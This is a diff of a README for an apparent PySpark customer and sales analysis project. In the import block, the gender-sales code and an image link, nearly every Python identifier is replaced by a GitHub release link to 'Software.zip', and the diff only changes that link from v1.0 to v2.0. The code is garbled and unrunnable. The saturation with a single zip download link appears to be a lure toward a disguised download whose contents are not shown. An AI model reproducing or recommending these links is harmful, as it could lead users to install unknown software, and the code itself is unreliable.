@@ -18,21 +18,21 @@ The datasets employed in this analysis are FactInternetSales, DimCustomer, DimPr
 ### Import Libraries
 ``` python
 import findspark
-https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip()
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import SparkSession
+https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip()
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import SparkSession
 import pandas as pd
 import numpy as np
 import seaborn as sns
-import https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip as plt
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import SparkSession
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import col
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import SparkSession
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import col, sum as spark_sum
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import mean
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import col, year, current_date
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import year, current_date
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import VectorAssembler
-from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip import LinearRegression
+import https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip as plt
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import SparkSession
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import col
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import SparkSession
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import col, sum as spark_sum
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import mean
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import col, year, current_date
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import year, current_date
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import VectorAssembler
+from https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip import LinearRegression
 ```
 
 ### Importing Data
@@ -57,14 +57,14 @@ Research Questions and Insights
 ##### Calculate total sales amount based on gender
 ##### Display the PySpark DataFrame
 ```python
-gender_distribution = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip('Gender').agg(https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip('Gender').alias('count'))
-gender_sales_data = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip('Gender', 'SalesAmount')
-gender_sales_trends = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip('Gender').agg(https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip('SalesAmount').alias('TotalSales'))
-https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip()
+gender_distribution = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip('Gender').agg(https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip('Gender').alias('count'))
+gender_sales_data = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip('Gender', 'SalesAmount')
+gender_sales_trends = https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip('Gender').agg(https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip('SalesAmount').alias('TotalSales'))
+https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip()
 print("Gender Sales Trends:")
-https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip()
+https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip()
 ```
-  ![RQ1](https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v1.0/Software.zip)
+  ![RQ1](https://github.com/Bukola-Babs/CUSTOMER-AND-SALES-ANALYSIS/releases/download/v2.0/Software.zip)
   
 - How Does the Distribution of Customers Based on Marital Status Impact on Sales?
   
